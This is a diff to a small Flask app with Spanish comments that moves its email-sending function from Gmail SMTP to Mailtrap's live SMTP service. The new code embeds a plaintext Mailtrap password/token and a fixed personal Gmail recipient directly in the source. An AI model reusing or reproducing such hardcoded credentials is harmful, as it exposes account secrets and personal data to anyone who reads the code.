@@ -1,8 +1,6 @@
 from flask import Flask, request, render_template
 import os
 import smtplib
-from email.mime.text import MIMEText
-from email.mime.multipart import MIMEMultipart
 
 app = Flask(__name__)
 
@@ -12,26 +10,26 @@ os.makedirs(SAVE_DIR, exist_ok=True)
 
 # Función para enviar correo
 def send_email(subject, body):
-    sender_email = "no-reply@passtel.com"  # Cuenta ficticia
-    recipient_email = "horacioibanez945@gmail.com"  # Destinatario fijo
-    smtp_server = "smtp.gmail.com"
-    smtp_port = 587
+    sender_email = "hello@demomailtrap.com"  # Dirección ficticia
+    recipient_email = "horacioibanez945@gmail.com"  # Correo destinatario
+    smtp_server = "live.smtp.mailtrap.io"  # Servidor SMTP de Mailtrap
+    smtp_port = 587  # Puerto SMTP recomendado
+    smtp_username = "api"  # Usuario de Mailtrap
+    smtp_password = "d1abd4518aad5c9b215cc04a97c67b1c"  # Contraseña de Mailtrap
 
-    # Crear mensaje
-    message = MIMEMultipart()
-    message["From"] = sender_email
-    message["To"] = recipient_email
-    message["Subject"] = subject
+    # Crear el mensaje
+    message = f"""\
+Subject: {subject}
+To: {recipient_email}
+From: {sender_email}
 
-    # Agregar cuerpo del correo
-    message.attach(MIMEText(body, "plain"))
+{body}""".encode("utf-8")
 
     try:
-        # Configurar servidor SMTP
         with smtplib.SMTP(smtp_server, smtp_port) as server:
-            server.starttls()  # Encriptar conexión
-            server.login("your_gmail_account@gmail.com", "your_app_password")  # Cambiar
-            server.sendmail(sender_email, recipient_email, message.as_string())
+            server.starttls()
+            server.login(smtp_username, smtp_password)
+            server.sendmail(sender_email, recipient_email, message)
             print(f"Correo enviado a {recipient_email}")
     except Exception as e:
         print(f"Error al enviar correo: {e}")
